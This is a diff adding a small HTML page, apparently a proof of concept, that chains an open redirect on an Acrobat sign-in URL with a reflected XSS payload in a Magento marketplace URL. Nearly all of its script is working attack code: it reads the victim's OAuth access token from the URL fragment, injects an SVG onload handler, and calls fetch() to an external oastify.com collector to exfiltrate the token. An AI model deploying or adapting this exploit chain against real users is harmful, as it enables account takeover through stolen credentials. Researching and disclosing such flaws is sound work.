@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Redirecting...</title></head>
+<body>
+<script>
+  // Grab the OAuth access token from the URL fragment
+  const token = window.location.hash;
+
+  // Build the malicious Magento XSS payload
+  const target = "https://marketplace.magento.com/extensions.html?p=2%22%3E" +
+                 "<svg/onload=fetch('https://hdyvx8deiqq1jmkws8zjcta2ctil6du2.oastify.com/?token=" +
+                 encodeURIComponent(token) + "')>";
+
+  // Use Acrobat's open redirect to forward to Magento
+  const acrobatRedirect = "https://acrobat.adobe.com/dc-chrome-extension/sign-in.html?pdfUrl=" + encodeURIComponent(target);
+
+  // Redirect the victim to trigger the XSS with the token
+  window.location.href = acrobatRedirect;
+</script>
+</body>
+</html>
